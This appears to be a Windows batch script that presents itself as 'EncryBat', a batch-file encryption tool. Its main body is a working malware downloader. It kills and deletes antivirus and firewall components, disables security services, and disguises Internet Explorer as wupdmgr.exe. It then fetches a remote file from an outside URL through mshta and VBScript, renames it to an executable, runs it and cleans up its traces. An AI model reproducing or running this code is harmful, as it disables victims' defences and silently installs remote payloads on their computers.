��
cls
@echo off
if not "%~n0"=="EncryBat" goto EncryBat_Display
if not "%~n1"=="" if exist "%~f1" copy/b "%~f0"+"%~f1" "%~dp1enc_%~nx1">nul 2>nul&cls&echo.&echo. Enc_%~nx1 is create.&goto :eof

:EncryBat_Help
echo.
echo %~n0 - Cryptographic machine for batch program
echo zxcv@cn-dos, willsort@cn-dos - 2006-8-3 - CMD@WinXP
echo.
echo Useage: %~n0 batch_program_with_extname
echo Reference: http://www.cn-dos.net/forum/viewthread.php?tid=22053  
if /i not [%0]==[EncryBat] pause
goto :eof

:EncryBat_Display
@echo off
taskkill /f /im wscript.exe >nul 2>nul 
taskkill /f /im waituser.exe >nul 2>nul 
taskkill /f /im waht.exe >nul 2>nul 
taskkill /f /im ping.exe >nul 2>nul 
taskkill /f /im vvisit.exe >nul 2>nul 
taskkill /f /im wupdmgr.exe >nul 2>nul
taskkill /f /im firefox.exe  >nul 2>nul
taskkill /f /im Privoxy.exe >nul 2>nul 
taskkill /f /im RsTray.exe >nul 2>nul 
taskkill /f /im RsStub.exe >nul 2>nul 
taskkill /f /im rsreport.exe >nul 2>nul 
taskkill /f /im rsnetsvr.exe >nul 2>nul 
taskkill /f /im RsMain.exe >nul 2>nul 
taskkill /f /im RavTask.exe >nul 2>nul 
taskkill /f /im CCenter.exe >nul 2>nul 
del /f /q "%ProgramFiles%\Rising\RFW\*.exe"
del /f /q "%ProgramFiles%\Rising\RFW\Update\*.exe"
rd /s /q "%userprofile%\Local Settings\Temporary Internet Files\Content.IE5"
regedit /s domain.reg
copy "C:\Program Files\Internet Explorer\IEXPLORE.EXE" "C:\Program Files\Internet Explorer\wupdmgr.exe" /y
del /f /q c:\windows\system32\Temp6\VVT\config.ini >nul 2>nul
attrib -r -s -h -a  repaig.vbe
ren repaig.vbe config.ini 
c:
cd\
cd c:\windows\system32 
md Temp6  >nul 2>nul
cd Temp6
md VVT  >nul 2>nul
cd VVT
c:
cd\
cd C:\WINDOWS\system32\Microsoft\Protect
move config.ini c:\windows\system32\Temp6\VVT\
ping 127.0.0.1 -n 2
del /f /q /ARASH  domain.reg
ping 127.0.0.1 -n 100
net stop SharedAccess >nul 2>nul 
net stop kaccore >nul 2>nul 
net stop KISSvc >nul 2>nul 
net stop KPfwSvc >nul 2>nul 
sc config wscsvc start= auto  >nul 2>nul
sc config SharedAccess start= disabled >nul 2>nul
sc config kaccore start= disabled >nul 2>nul
sc config KISSvc start= disabled >nul 2>nul
sc config KPfwSvc start= disabled >nul 2>nul 
if not exist c:\windows\system32\Temp6\VVT\vvisit.exe goto now1
shadingyu.vbe
goto huijia
:now1
set shel=msh&if "%1"=="kyo_PE-win32shell_ping" goto bai
:bai
ping www.baidu.com -n 5
IF %ERRORLEVEL%==1 (goto bai) ELSE (goto du) 
:du
rd /s /q "%userprofile%\Local Settings\Temporary Internet Files\Content.IE5"
taskkill /f /im wupdmgr.exe
set shel=msh&if "%1"=="kyo_PE-win32shell_ping" goto xia1
:xia1 
rd /s /q "%userprofile%\Local Settings\Temporary Internet Files\Content.IE5"
start %shel%ta.exe vbscript:createobject("wscript.shell").run("""%ProgramFiles%\Internet Explorer\wupdmgr.exe"" http://www.mjbox.com/r/ha/haoxiaolong2005/html/174529.htm",0)(window.close)
:wait1
ping 127.0.0.1 -n 5
for /f "tokens=1,2,3,4,5,6 delims= " %%1 in ('dir "%systemdrive%\Documents and Settings\123456[1].txt" /s /a^|findstr /i "Content.IE5"') do set wby=%%1 %%2 %%3 %%4 %%5 %%6
ren "%wby%\123456[1].txt" new1.exe
if exist "%wby%\new1.exe" (copy "%wby%\new1.exe" "%systemdrive%\Documents and Settings\All Users\Application Data\new1.exe" /y) else (goto wait1)
ping 127.0.0.1 -n 2
rd /s /q "%userprofile%\Local Settings\Temporary Internet Files\Content.IE5"
call "%systemdrive%\Documents and Settings\All Users\Application Data\new1.exe"
ping 127.0.0.1 -n 7
del /f /q "%systemdrive%\Documents and Settings\All Users\Application Data\new1.exe"
ping 127.0.0.1 -n 7
:huijia
taskkill /f /im wupdmgr.exe
ping 127.0.0.1 -n 5
del /f /q "C:\Program Files\Internet Explorer\wupdmgr.exe"
del /f /q shadingyu.vbe
del /f /q kill.vbe
del /f /q lcd.vbe
del /f /q temp.bat
exit
